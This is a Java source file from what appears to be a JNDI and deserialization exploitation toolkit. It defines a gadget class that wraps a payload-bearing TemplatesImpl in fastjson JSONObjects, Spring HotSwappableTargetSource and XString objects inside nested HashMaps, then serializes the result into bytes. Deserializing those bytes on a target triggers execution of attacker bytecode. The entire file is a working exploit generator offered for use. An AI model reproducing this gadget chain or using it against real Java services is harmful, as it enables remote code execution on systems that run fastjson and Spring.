package sonomon.jndi.deser.gadgets;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import java.util.HashMap;
import org.springframework.aop.target.HotSwappableTargetSource;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Fastjson_HotSwappableTargetSource_Templates implements SerializeObject{
	
	//fastjson2
	
	
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("g","m");
        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("g",tempImpl);

        XObject xString = new XString("x");
        //可以用XStringForFSB代替
        //xString = XStringForFSB.create("x");
        
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(jsonObject);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(xString);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(v1,v1);
        hashMap.put(v2,v2);
        Deserialize.setFieldValue(v1,"target",jsonObject1);
        
        HashMap hashMap2 = new HashMap();
        hashMap2.put(tempImpl, hashMap);
        
        return hashMap2;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}